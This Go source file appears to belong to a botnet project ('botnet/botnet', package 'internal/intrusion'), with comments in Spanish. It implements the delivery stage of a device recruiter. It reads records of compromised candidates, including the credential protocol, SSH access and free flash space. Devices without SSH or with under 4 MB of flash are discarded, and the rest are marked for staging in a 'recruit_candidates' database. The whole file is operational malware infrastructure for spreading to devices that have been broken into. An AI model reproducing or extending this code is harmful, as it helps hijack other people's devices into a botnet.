package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"os"

	"github.com/botnet/botnet/internal/intrusion"
)

// Etapa de entrega (T-1705): la ruta la elige `cred_protocol`. Si se entro
// por http y no hay SSH, no se puede entregar: muere por `no_delivery`. Y el
// flash manda: sin 4 MB libres no se copia (`flash_cap`), lo decide
// DestPolicy.

// lineaEntrega es un candidato con lo que sabe el reclutador de el.
type lineaEntrega struct {
	IP            string `json:"ip"`
	Port          int    `json:"port"`
	CredProtocol  string `json:"cred_protocol"`
	SSHOK         bool   `json:"ssh_ok"`
	OverlayFreeKB int64  `json:"overlay_free_kb"`
}

// ejecutarDeliver aplica la politica y entrega.
func ejecutarDeliver(ctx context.Context, rutaJSON string, dryRun bool) error {
	if rutaJSON == "" {
		return fmt.Errorf("deliver sin red: pasa --deliver-json")
	}
	f, err := os.Open(rutaJSON)
	if err != nil {
		return err
	}
	defer f.Close()
	st, err := abreStore()
	if err != nil {
		return err
	}
	defer st.Close()

	sc := bufio.NewScanner(f)
	var entregados, sinEntrega, sinFlash int
	for sc.Scan() {
		if len(sc.Bytes()) == 0 {
			continue
		}
		var l lineaEntrega
		if err := json.Unmarshal(sc.Bytes(), &l); err != nil {
			return err
		}
		id, err := st.CandidatoPorIP(ctx, l.IP, l.Port)
		if err != nil {
			continue
		}
		// El flash manda sobre el protocolo.
		var clase string
		if err := st.DBQueryRow(ctx, `SELECT COALESCE(device_class,'C') FROM recruit_candidates WHERE candidate_id=$1`, id).Scan(&clase); err != nil {
			continue
		}
		_, motivo, err := intrusion.DestPolicy(clase, l.OverlayFreeKB)
		if err != nil {
			if dryRun {
				fmt.Printf("discard ip=%s reason=flash_cap\n", l.IP)
			} else if err := st.MarcarEntrega(ctx, id, "discarded", "flash_cap", "probe"); err != nil {
				return err
			}
			sinFlash++
			continue
		}
		if l.CredProtocol != "ssh" || !l.SSHOK {
			if dryRun {
				fmt.Printf("discard ip=%s reason=no_delivery\n", l.IP)
			} else if err := st.MarcarEntrega(ctx, id, "discarded", "no_delivery", "probe"); err != nil {
				return err
			}
			sinEntrega++
			continue
		}
		if dryRun {
			fmt.Printf("deliver ip=%s dir=%s\n", l.IP, motivo)
		} else if err := st.MarcarEntrega(ctx, id, "staging", "", "probe"); err != nil {
			return err
		}
		entregados++
	}
	if err := sc.Err(); err != nil {
		return err
	}
	if !dryRun {
		fmt.Printf("deliver: entregados=%d no_delivery=%d flash_cap=%d\n", entregados, sinEntrega, sinFlash)
	}
	return nil
}
